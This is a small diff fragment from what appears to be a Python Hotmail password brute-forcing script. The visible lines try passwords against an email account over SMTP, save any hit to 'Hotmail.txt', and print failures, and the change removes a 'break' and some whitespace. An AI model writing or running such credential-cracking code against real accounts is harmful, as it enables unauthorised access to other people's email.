@@ -121,10 +121,8 @@ def proxy():
                     Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
                 except smtplib.SMTPAuthenticationError:
                     print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
-		break
-    
-                      
-
+		
+                       
 else:
     print(use.usage)
     exit()  
